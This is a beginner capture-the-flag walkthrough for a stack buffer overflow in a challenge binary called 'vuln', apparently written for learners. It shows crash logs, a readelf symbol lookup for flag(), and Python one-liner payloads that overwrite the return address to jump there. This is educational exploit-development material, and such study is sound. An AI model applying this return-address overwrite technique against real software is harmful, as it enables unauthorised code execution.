This is the first program, where we look into buffer overflows. 

***Objective***

Print the data inside flag()

If this is your first time solving a buffer overflow, I suggest: https://www.youtube.com/watch?v=1S0aBV-Waeo

Attempt the question, after watching the video, if you are still unable to solve the problem, ping me, I ll share my writeup.





>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
>>>./vuln
Give me a string and lets see what happens: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Woah, were jumping to 0x41414141 !
Segmentation fault
>>>dmesg | tail
[  190.764070] rndis_host 2-2:1.0 usb0: register 'rndis_host' at usb-0000:00:1d.7-2, RNDIS device, b2:7e:94:04:61:ec
[  190.764109] usbcore: registered new interface driver rndis_host
[  309.720849] vuln[1599]: segfault at 61616161 ip 0000000061616161 sp 00000000fffcf330 error 14 in libc-2.31.so[f7ced000+1e2000]
[  309.720866] Code: Bad RIP value.
[  317.817127] vuln[1602]: segfault at 41414141 ip 0000000041414141 sp 00000000ffbf5e60 error 14 in libc-2.31.so[f7cea000+1e2000]
[  317.817145] Code: Bad RIP value.
[  365.020859] perf: interrupt took too long (2521 > 2500), lowering kernel.perf_event_max_sample_rate to 79250
[  437.673486] perf: interrupt took too long (3172 > 3151), lowering kernel.perf_event_max_sample_rate to 63000
[  726.064188] vuln[2008]: segfault at 41414141 ip 0000000041414141 sp 00000000ffaf0de0 error 14 in libc-2.31.so[f7dc2000+1e2000]
[  726.064205] Code: Bad RIP value.
>>>readelf -s vuln
64: 00000000     0 FUNC    GLOBAL DEFAULT  UND fopen@@GLIBC_2.1
    65: 0804a040     0 NOTYPE  GLOBAL DEFAULT   25 _end
    66: 08048510     2 FUNC    GLOBAL HIDDEN    14 _dl_relocate_sta[...]
    67: 080484d0     0 FUNC    GLOBAL DEFAULT   14 _start
    68: 08048798     4 OBJECT  GLOBAL DEFAULT   16 _fp_hw
    69: 00000000     0 OBJECT  GLOBAL DEFAULT  UND stdout@@GLIBC_2.0
    70: 0804a03c     0 NOTYPE  GLOBAL DEFAULT   25 __bss_start
    71: 0804869e   118 FUNC    GLOBAL DEFAULT   14 main
    72: 0804a03c     0 OBJECT  GLOBAL HIDDEN    24 __TMC_END__
    73: 00000000     0 FUNC    GLOBAL DEFAULT  UND setresgid@@GLIBC_2.0
    74: 080485e6   121 FUNC    GLOBAL DEFAULT   14 flag
    75: 080483e8     0 FUNC    GLOBAL DEFAULT   11 _init

here the flag is the function we need to run its memory location is 080485e6
>>>python -c "import struct; print repr(struct.pack('<I',0x080485e6))"
'\xe6\x85\x04\x08'
>>>python -c "import struct; print 'A'*65 + struct.pack('<I',0x080485e6)" | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x8048705 !
>>>python -c "import struct; print 'A'*67 + struct.pack('<I',0x080485e6)" | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x8048705 !
>>>python -c "import struct; print 'A'*68 + struct.pack('<I',0x080485e6)" | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x8048705 !
Flag File is Missing. please contact an Admin if you are running this on the shell server.





